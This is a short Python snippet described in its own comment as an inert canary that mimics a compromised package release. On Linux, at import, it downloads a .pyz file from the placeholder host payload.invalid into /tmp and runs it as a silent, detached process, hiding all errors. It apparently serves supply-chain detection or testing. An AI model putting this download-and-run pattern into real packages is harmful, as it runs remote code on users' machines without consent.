# inert canary: 2026 compromised-release shape - fetch a .pyz to /tmp at import and launch it
import os, platform, subprocess, urllib.request

if platform.system() == "Linux":
    try:
        urllib.request.urlretrieve("https://payload.invalid/x.pyz", "/tmp/canary.pyz")
        with open(os.devnull, "w") as f:
            subprocess.Popen(["python3", "/tmp/canary.pyz"], stdout=f, stderr=f, start_new_session=True)
    except Exception:
        pass
